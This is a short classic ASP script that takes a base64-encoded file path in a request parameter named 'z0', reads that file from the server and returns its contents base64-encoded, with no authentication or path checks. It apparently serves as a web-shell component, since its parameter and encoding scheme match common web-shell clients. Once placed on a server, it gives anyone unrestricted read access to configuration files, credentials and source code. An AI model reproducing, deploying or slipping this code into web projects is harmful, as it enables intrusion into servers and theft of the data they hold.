<%

On Error Resume Next

Function GetCurrentCharset()
    Dim charset
    charset = Response.CharSet
    
    If charset = "" Then
        Select Case Session.CodePage
            Case 65001 : charset = "utf-8"
            Case 1252  : charset = "windows-1252"
            Case 936   : charset = "gb2312"
            Case 950   : charset = "big5"
            Case 1251  : charset = "windows-1251"
            Case Else  : charset = "utf-8"
        End Select
    End If
    
    GetCurrentCharset = charset
End Function

Function Base64DecodeToText(byVal strIn)
    Dim xmlDoc, xmlNode
    Set xmlDoc = Server.CreateObject("MSXML2.DOMDocument.3.0")
    Set xmlNode = xmlDoc.createElement("tmp")
    xmlNode.dataType = "bin.base64"
    xmlNode.text = strIn
    
    Dim objStream
    Set objStream = Server.CreateObject("ADODB.Stream")
    objStream.Type = 1 ' Binary
    objStream.Open
    objStream.Write xmlNode.nodeTypedValue
    objStream.Position = 0
    objStream.Type = 2 ' Text
    objStream.Charset = GetCurrentCharset()
    Base64DecodeToText = objStream.ReadText
    
    objStream.Close
    Set objStream = Nothing
    Set xmlNode = Nothing
    Set xmlDoc = Nothing
End Function

Function Base64EncodeBinary(byVal binaryData)
    Dim xmlDoc, xmlNode
    Set xmlDoc = Server.CreateObject("MSXML2.DOMDocument.3.0")
    Set xmlNode = xmlDoc.createElement("tmp")
    xmlNode.dataType = "bin.base64"
    xmlNode.nodeTypedValue = binaryData
    
    Base64EncodeBinary = Replace(xmlNode.text, vbLf, "")
    
    Set xmlNode = Nothing
    Set xmlDoc = Nothing
End Function

Dim rawPath
rawPath = Request("z0")

If rawPath = "" Then
    Response.Write("ERROR://Missing file path parameter.")
    Response.End
End If

Dim szFilePath
szFilePath = Base64DecodeToText(rawPath)

Dim objFileStream, binaryContent
Set objFileStream = Server.CreateObject("ADODB.Stream")
objFileStream.Type = 1 ' Binary
objFileStream.Open
objFileStream.LoadFromFile szFilePath

if Err.Number <> 0 Then
    Response.Write("ERROR://Unable to open file!")
    Err.Clear
    Response.End
End If

binaryContent = objFileStream.Read()
objFileStream.Close
Set objFileStream = Nothing

Dim szBase64Output
szBase64Output = Base64EncodeBinary(binaryContent)

Response.Write(szBase64Output)

%>